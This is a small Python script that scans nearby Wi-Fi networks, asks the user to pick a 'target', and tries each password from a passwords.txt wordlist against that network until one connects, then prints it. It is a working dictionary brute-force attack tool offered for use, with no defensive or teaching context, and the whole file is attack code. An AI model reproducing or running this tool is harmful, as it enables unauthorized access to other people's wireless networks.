#!/usr/bin/env python3
'''
Created on 13.10.2016

@author: Brom
@e-mail: wasalev@mail.ru
'''

import net_wrap
interfacesList=net_wrap.interfacesList()
print('Choose interface:\n')
for inter in interfacesList:
	print("["+str(interfacesList.index(inter))+"] "+inter)
curIntIndex=int(input(">>> "))
curInt=interfacesList[curIntIndex]
targetsList=net_wrap.wifiList(curInt)
print('Choose target: ')
for cell in targetsList:
	print("["+str(targetsList.index(cell))+"] "+cell['Address']+" | "+cell['ESSID']+" | Encryption key: "+cell['Encryption key']  +"\n")
targetIndex=int(input(">>> "))
target=targetsList[targetIndex]
with open("passwords.txt") as infile:
    for password in infile:
    	print("Try: "+password+"\n")
    	res=net_wrap.tryConnect(target['ESSID'], password, curInt)
    	if res==True:
    		print("="*20)
    		print(password)
    		exit()
	
